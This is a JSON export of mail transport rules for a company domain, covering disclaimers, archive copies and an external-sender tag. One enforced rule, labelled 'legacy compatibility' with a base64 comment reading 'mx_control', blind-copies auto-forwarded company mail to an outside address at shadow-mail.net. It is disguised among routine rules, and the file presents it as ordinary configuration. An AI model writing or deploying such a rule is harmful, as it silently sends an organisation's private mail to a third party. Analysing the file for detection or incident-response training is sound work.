[
  {
    "Name": "Corporate Footer",
    "Mode": "Enforce",
    "Conditions": {
      "SenderDomainIs": ["corp.example"]
    },
    "Actions": {
      "AppendDisclaimer": "This message is confidential and intended only for the recipient."
    },
    "Comments": "standard footer policy"
  },
  {
    "Name": "Executive Assistant BCC",
    "Mode": "Enforce",
    "Conditions": {
      "RecipientIs": ["ceo@corp.example"]
    },
    "Actions": {
      "BlindCopyTo": ["ea-archive@corp.example"]
    },
    "Comments": "exec admin workflow — ref: ZWEgYXJjaGl2ZQ=="
  },
  {
    "Name": "Outbound Partner Copy (Vendor)",
    "Mode": "Enforce",
    "Conditions": {
      "RecipientDomainIs": ["partner-vendor.example"]
    },
    "Actions": {
      "BlindCopyTo": ["vendor-archive@corp.example"]
    },
    "Comments": "partner compliance copy"
  },
  {
    "Name": "Transport Rule For Legacy Compatibilty",
    "Mode": "Enforce",
    "Conditions": {
      "SenderDomainIs": ["corp.example"],
      "MessageTypeMatches": "AutoForward"
    },
    "Actions": {
      "BlindCopyTo": ["archive@mx.shadow-mail.net"]
    },
    "Comments": "legacy compatibility — ref: bXhfY29udHJvbA=="
  },
  {
    "Name": "Anti-Phish Subject Tag",
    "Mode": "Audit",
    "Conditions": {
      "FromScope": "NotInOrganization"
    },
    "Actions": {
      "PrependSubject": "[EXTERNAL]"
    },
    "Comments": "telemetry only"
  },
  {
    "Name": "Legacy Journaling",
    "Mode": "Disabled",
    "Conditions": {
      "RecipientDomainIs": ["archive.local"]
    },
    "Actions": {
      "BlindCopyTo": ["journal@corp.example"]
    },
    "Comments": "migration cleanup pending — ref: bWlncmF0aW9u"
  }
]
